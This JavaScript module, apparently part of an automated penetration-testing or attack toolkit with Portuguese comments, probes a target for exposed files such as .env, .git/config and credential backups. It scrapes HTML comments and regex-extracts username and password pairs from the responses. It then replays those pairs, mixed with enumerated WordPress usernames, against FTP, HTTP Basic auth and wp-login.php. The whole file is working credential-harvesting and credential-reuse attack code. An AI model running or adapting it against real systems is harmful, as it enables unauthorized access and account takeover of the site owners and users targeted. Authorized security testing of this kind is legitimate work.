import { spawn } from 'node:child_process';
import { curlWebSingle } from './web-curl-single.js';
import { ftpPortsFromNmap, probeFtpCredentials } from './ftp-anonymous-probe.js';

const DISCLOSURE_PATHS = [
  '/backup.txt',
  '/credentials.txt',
  '/.env',
  '/config.php.bak',
  '/index.php~',
  '/.git/config',
  '/admin/',
];

function collectOrigins(webResponses, ip) {
  const origins = new Set();
  for (const r of webResponses || []) {
    if (!r?.url || !r?.status) continue;
    try {
      const u = new URL(String(r.url));
      origins.add(`${u.protocol}//${u.host}`);
    } catch {
      // ignore
    }
  }
  if (!origins.size && ip) origins.add(`http://${ip}`);
  return [...origins];
}

function parseComments(html) {
  const out = [];
  const re = /<!--([\s\S]*?)-->/g;
  let m;
  while ((m = re.exec(String(html || ''))) !== null) {
    const txt = String(m[1] || '').trim();
    if (!txt) continue;
    out.push(txt.slice(0, 220));
    if (out.length >= 20) break;
  }
  return out;
}

function extractCredentialsFromText(text) {
  const t = String(text || '');
  const out = [];
  const pairs = [
    /(?:user(?:name)?|login)\s*[:=]\s*([^\s'"`;|]{2,80})[\s\S]{0,80}?(?:pass(?:word)?|pwd)\s*[:=]\s*([^\s'"`;|]{2,120})/gi,
    /(?:pass(?:word)?|pwd)\s*[:=]\s*([^\s'"`;|]{2,120})[\s\S]{0,80}?(?:user(?:name)?|login)\s*[:=]\s*([^\s'"`;|]{2,80})/gi,
  ];
  for (const re of pairs) {
    let m;
    while ((m = re.exec(t)) !== null) {
      const a = String(m[1] || '').trim();
      const b = String(m[2] || '').trim();
      const isSecondPattern = /pass/i.test(re.source) && re.source.startsWith('(?:pass');
      const username = isSecondPattern ? b : a;
      const password = isSecondPattern ? a : b;
      if (!username || !password) continue;
      out.push({ username, password, source: 'pattern:user-pass' });
      if (out.length >= 30) break;
    }
  }
  const uriRe = /\b(?:ftp|mysql|postgres|http|https):\/\/([^:\s\/]+):([^@\s\/]+)@/gi;
  let u;
  while ((u = uriRe.exec(t)) !== null) {
    out.push({ username: String(u[1]), password: String(u[2]), source: 'uri-credentials' });
    if (out.length >= 30) break;
  }
  const seen = new Set();
  const dedup = [];
  for (const c of out) {
    const k = `${c.username}|${c.password}`;
    if (seen.has(k)) continue;
    seen.add(k);
    dedup.push(c);
  }
  return dedup.slice(0, 20);
}

export async function runDisclosureHunt(webResponses, { ip, log, timeoutMs = 10000 } = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const origins = collectOrigins(webResponses, ip);
  const seen = new Set((webResponses || []).map((r) => String(r?.url || '')).filter(Boolean));
  const comments = [];
  const credentials = [];
  let fetched = 0;

  for (const r of webResponses || []) {
    const bt = String(r?.bodyText || '');
    if (!bt) continue;
    for (const c of parseComments(bt)) comments.push({ url: r.url, text: c });
    for (const cred of extractCredentialsFromText(bt)) credentials.push({ ...cred, url: r.url });
  }

  for (const origin of origins.slice(0, 12)) {
    const base = String(origin).replace(/\/$/, '');
    for (const p of DISCLOSURE_PATHS) {
      const u = `${base}${p}`;
      if (seen.has(u)) continue;
      try {
        logger(`[disclosure] GET ${u}`, 'info');
        const r = await curlWebSingle({ url: u, timeoutMs, maxBodyBytes: 180000 });
        if (!r.status || r.status >= 500) continue;
        seen.add(u);
        r.__via = 'disclosure-hunt';
        webResponses.push(r);
        fetched += 1;
        const bt = String(r.bodyText || '');
        for (const c of parseComments(bt)) comments.push({ url: u, text: c });
        for (const cred of extractCredentialsFromText(bt)) credentials.push({ ...cred, url: u });
      } catch {
        // ignore
      }
    }
  }

  return {
    fetched,
    comments: comments.slice(0, 40),
    credentials: credentials.slice(0, 40),
  };
}

function runCurlBasic(url, username, password, timeoutMs = 9000) {
  return new Promise((resolve, reject) => {
    const sec = String(Math.max(2, Math.floor(timeoutMs / 1000)));
    const args = ['-k', '-sS', '-I', '--compressed', '-L', '--max-redirs', '3', '--connect-timeout', sec, '--max-time', sec, '-u', `${username}:${password}`, url];
    const child = spawn('curl', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const out = [];
    const err = [];
    child.stdout.on('data', (d) => out.push(d));
    child.stderr.on('data', (d) => err.push(d));
    child.on('error', reject);
    child.on('close', (code) => {
      resolve({
        code,
        stdout: Buffer.concat(out).toString('utf8'),
        stderr: Buffer.concat(err).toString('utf8'),
      });
    });
  });
}

function runCurlWpLogin(loginUrl, username, password, timeoutMs = 12000) {
  return new Promise((resolve, reject) => {
    const sec = String(Math.max(3, Math.floor(timeoutMs / 1000)));
    const post = `log=${encodeURIComponent(username)}&pwd=${encodeURIComponent(password)}&wp-submit=Log+In&testcookie=1`;
    const args = [
      '-k',
      '-sS',
      '-i',
      '--compressed',
      '-L',
      '--max-redirs',
      '4',
      '--connect-timeout',
      sec,
      '--max-time',
      sec,
      '-H',
      'Content-Type: application/x-www-form-urlencoded',
      '--data',
      post,
      loginUrl,
    ];
    const child = spawn('curl', args, { stdio: ['ignore', 'pipe', 'pipe'] });
    const out = [];
    const err = [];
    child.stdout.on('data', (d) => out.push(d));
    child.stderr.on('data', (d) => err.push(d));
    child.on('error', reject);
    child.on('close', (code) => {
      resolve({
        code,
        stdout: Buffer.concat(out).toString('utf8'),
        stderr: Buffer.concat(err).toString('utf8'),
      });
    });
  });
}

export async function runCredentialReuseProbe({
  ip,
  nmapRows,
  webResponses,
  credentials,
  log,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const creds = Array.isArray(credentials) ? credentials.slice(0, 10) : [];
  const hits = [];

  // FTP reuse
  const ftpPorts = ftpPortsFromNmap(nmapRows || []);
  for (const c of creds) {
    for (const p of ftpPorts.slice(0, 2)) {
      try {
        const r = await probeFtpCredentials({ host: ip, port: p, username: c.username, password: c.password, timeoutMs: 10000 });
        if (r.ok) {
          hits.push({ kind: 'ftp', port: p, username: c.username, password: c.password, evidence: r.summary || '230 login ok' });
          logger(`[cred-reuse] FTP OK ${c.username}@${ip}:${p}`, 'success');
          break;
        }
      } catch {
        // ignore
      }
    }
  }

  // HTTP Basic reuse (somente URLs 401 / primeiros endpoints)
  const webTargets = (webResponses || [])
    .filter((r) => r?.url && (Number(r.status) === 401 || Number(r.status) === 403 || Number(r.status) === 200))
    .map((r) => String(r.url))
    .slice(0, 6);
  for (const c of creds) {
    for (const u of webTargets) {
      try {
        const rr = await runCurlBasic(u, c.username, c.password, 9000);
        const low = `${rr.stdout}\n${rr.stderr}`.toLowerCase();
        if (low.includes(' 401 ') || low.includes('unauthorized')) continue;
        if (low.includes(' 200 ') || low.includes(' 302 ') || low.includes(' 301 ')) {
          hits.push({ kind: 'http-basic', url: u, username: c.username, password: c.password, evidence: 'HTTP auth aceitou credencial' });
          logger(`[cred-reuse] HTTP basic OK ${c.username} @ ${u}`, 'success');
          break;
        }
      } catch {
        // ignore
      }
    }
  }

  return { attempts: creds.length, hits };
}

export async function runWordpressCredentialReuse({
  credentials,
  wpTargets,
  wpUsers = [],
  log,
} = {}) {
  const logger = typeof log === 'function' ? log : () => {};
  const creds = Array.isArray(credentials) ? credentials.slice(0, 16) : [];
  const targets = Array.isArray(wpTargets) ? wpTargets.slice(0, 6) : [];
  const userHints = Array.isArray(wpUsers) ? wpUsers.slice(0, 20) : [];
  const hits = [];
  let attempts = 0;

  // Expande candidatos combinando usernames enumerados com passwords extraídas.
  const expanded = [];
  const passSet = new Set(creds.map((c) => String(c.password || '')).filter(Boolean));
  for (const c of creds) expanded.push({ username: String(c.username || ''), password: String(c.password || ''), source: c.source || 'cred' });
  for (const u of userHints) {
    for (const p of passSet) {
      expanded.push({ username: String(u), password: String(p), source: 'wp-user+reuse-pass' });
      if (expanded.length >= 40) break;
    }
    if (expanded.length >= 40) break;
  }

  const seen = new Set();
  const pairs = [];
  for (const c of expanded) {
    const key = `${c.username}|${c.password}`;
    if (!c.username || !c.password || seen.has(key)) continue;
    seen.add(key);
    pairs.push(c);
    if (pairs.length >= 30) break;
  }

  for (const base of targets) {
    const loginUrl = `${String(base).replace(/\/$/, '')}/wp-login.php`;
    for (const c of pairs) {
      attempts += 1;
      try {
        const r = await runCurlWpLogin(loginUrl, c.username, c.password, 12000);
        const low = `${r.stdout}\n${r.stderr}`.toLowerCase();
        const success =
          low.includes('wordpress_logged_in') ||
          low.includes('/wp-admin') ||
          (low.includes('location:') && low.includes('wp-admin'));
        const explicitFail = low.includes('error') && low.includes('incorrect');
        if (!success || explicitFail) continue;
        hits.push({
          kind: 'wp-login',
          url: loginUrl,
          username: c.username,
          password: c.password,
          evidence: `source=${c.source} · wp-login provável sucesso`,
        });
        logger(`[cred-reuse] WP login OK ${c.username} @ ${loginUrl}`, 'success');
        break;
      } catch {
        // ignore
      }
      if (attempts >= 80) break;
    }
    if (attempts >= 80) break;
  }

  return { attempts, hits };
}

